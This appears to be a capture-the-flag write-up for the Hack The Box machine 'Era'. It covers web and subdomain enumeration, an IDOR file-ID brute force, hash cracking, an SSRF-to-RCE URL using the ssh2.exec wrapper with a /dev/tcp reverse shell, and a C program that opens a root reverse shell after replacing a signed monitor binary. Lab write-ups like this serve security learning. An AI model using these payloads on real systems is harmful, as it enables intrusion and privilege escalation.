---
title: 'HTB Era Writeup'
date: 2025-07-31
permalink: /posts/2025/07/HTB_Era_Writeup/
tags:
  - HTB
  - writeup
  - medium
---

A writeup of the Hack The Box machine "Era" with medium difficulty

# HTB_Era

Welcome to this writeup of the Medium difficulty hack the box machine: Era.

![image.png](/images/HTB_Era/image.png)

This is an active seasonal Linux machine (season 8 week 11).

# Enumeration

`nmap -sV -sC 10.10.11.79`

![image.png](/images/HTB_Era/image%201.png)

Add the domain to the hosts list: 

`echo "10.10.11.79 era.htb" | sudo tee -a /etc/hosts`

And the FPT port is open (port 21).

Looking at the website, it’s a design company for your business. 

There is a contact us form at the end of the homepage:

![image.png](/images/HTB_Era/image%202.png)

The portfolio images are located at `http://era.htb/img/portfolio_pic1.jpg`

Checking other dirs:

`gobuster dir -u http://era.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt`

![image.png](/images/HTB_Era/image%203.png)

Except for index.html, those are restricted URL’s.

Checking ftp:

`ftp era.htb`

![image.png](/images/HTB_Era/image%204.png)

Looking at t he source code of the app: It uses `fancyBox 2.1.5` and other javascript framework such as `bootstrap 3.3.1` and `jqeury 1.11.0`. There is also a `wow.js` and a `custom.js`.

The contact us form does not work, you can’t send the information.

Checking subdomains:

`ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://FUZZ.era.htb -mc all`

Nope no find.

But the DNS address is not registered I forgot:

`ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://era.htb -H "Host: FUZZ.era.htb" -fs 0 -mc 200` 

![image.png](/images/HTB_Era/image%205.png)

`echo "10.10.11.79 file.era.htb" | sudo tee -a /etc/hosts`

All right we have a storage server:

![image.png](/images/HTB_Era/image%206.png)

We need a username to login with a password or the security questions of the user.

`gobuster dir -u http://file.era.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt --exclude-length 6765`

![image.png](/images/HTB_Era/image%207.png)

All of them are forbidden.

Ah wait I tried it again with the `-X php` tag

`gobuster dir -u http://file.era.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt --exclude-length 6765 -x php`

![image.png](/images/HTB_Era/image%208.png)

We can register and login:

![image.png](/images/HTB_Era/image%209.png)

When uploading a file you are given a download link:

![image.png](/images/HTB_Era/image%2010.png)

We can try to exploit this parameter:, because every file gets an id:

We can use the burp suite intruder for this, as the payload configuration I used this wordlist: https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/4-digits-0000-9999.txt

![image.png](/images/HTB_Era/image%2011.png)

This takes a bit of time but after it has been running for a while, filter it on Length:

![image.png](/images/HTB_Era/image%2012.png)

id 54 and 150 have a different Length value so let’s take a look at these files:

![image.png](/images/HTB_Era/image%2013.png)

![image.png](/images/HTB_Era/image%2014.png)

Looking trough the code:

There is a filedb.sqlite database file.

And in the signing zip is a private key present for who knows what.

Let’s take a look in side this database:

`sqlite3 filedb.sqlite`

`.dump`

![image.png](/images/HTB_Era/image%2015.png)

Yes jackpot, 

`admin_ef01cab31aa`

`eric`

`veronica`

`yuri`

`john`

`ethan`

Let’s try to crack these passwords:

`hash.txt`

![image.png](/images/HTB_Era/image%2016.png)

![image.png](/images/HTB_Era/image%2017.png)

So america and mustang:

`eric:america`

`yuri:mustang` 

Using these at the FTP server did not get us anything.

While looking at the code from earlier I found in `download.php` that there is a vulnerability. A SSRF where the server uses user input via the format parameter to connect to internal services:

If a user inputs this: `GET /download.php?id=1&show=true&format=http://localhost:8080/`
Then PHP does this: `fopen("http://localhost:8080/1", 'r');`

But we need to be admin to exploit this.

Oh we can update the security question for another user, so I changes this for the `admin_ef01cab31aa` user.

Now we can login with these security questions at [http://file.era.htb/security_login.php](http://file.era.htb/security_login.php)

![image.png](/images/HTB_Era/image%2018.png)

And yes we are logged in:

![image.png](/images/HTB_Era/image%2019.png)

Now we try to get RCE via the browser (or burp suite):

`http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/bash -c "bash%20-i%20>%26%20%2Fdev%2Ftcp%2F<YOUR_IP>%2F4444%200%3E%261%22;`

On your machine:

`nc -lnvp 4444`

![image.png](/images/HTB_Era/image%2020.png)

Stabilize the shell:

`python3 -c 'import pty; pty.spawn("/bin/bash")'` 

`Ctrl+Z` 

`stty raw -echo; fg` 

But we are now yuri and there is no flag here, so it’s up to eric:

![image.png](/images/HTB_Era/image%2021.png)

# Privilege escalation

Let’s run `linpeas.sh`:

On my machine: `python3 -m http.server 8000`

On the target machine: `wget http://10.10.14.1:8000/linpeas.sh`

`chmod +x linpeas.sh`

`./linpeas.sh`

Going trough the results I found this:

![image.png](/images/HTB_Era/image%2022.png)

There is some kind of monitor tool called AV.

These files in the `/opt/AV/` dir are running as root.

![image.png](/images/HTB_Era/image%2023.png)

We can try to exploit this with a malicious file:

Create a file: `exploit.c` 

```c
#include <unistd.h>
int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/<YOUR_IP>/1337 0>&1", NULL);
    return 0;
}
```

We create a static link:
`x86_64-linux-gnu-gcc -o monitor exploit.c -static` 

Check if the file exists:

`file monitor` 

![image.png](/images/HTB_Era/image%2024.png)

We need to sign this file with the private key we found earlier in the `signing.zip`.

`git clone https://github.com/NUAA-WatchDog/linux-elf-binary-signer.git`

`cd linux-elf-binary-signer`

`make clean`

`gcc -o elf-sign elf_sign.c -lssl -lcrypto -Wno-deprecated-declarations`

Now sign the file:

Make a file `key.pem`:

![image.png](/images/HTB_Era/image%2025.png)

`./elf-sign sha256 key.pem key.pem ../monitor` 

![image.png](/images/HTB_Era/image%2026.png)

`mv ../monitor ../monitor.1` 

Upload this file to the remote host to the directory `/opt/AV/periodic-checks`:

`python3 -m http.server 8000`

`wget http://<YOUR_IP>:8000/monitor.1` 

![image.png](/images/HTB_Era/image%2027.png)

`rm monitor`

`mv monitor.1 monitor`

`chmod +x monitor` 

`./monitor`

![image.png](/images/HTB_Era/image%2028.png)

On our local machine before we run the file:

`nc -lnvp 1337` 

![image.png](/images/HTB_Era/image%2029.png)

![image.png](/images/HTB_Era/image%2030.png)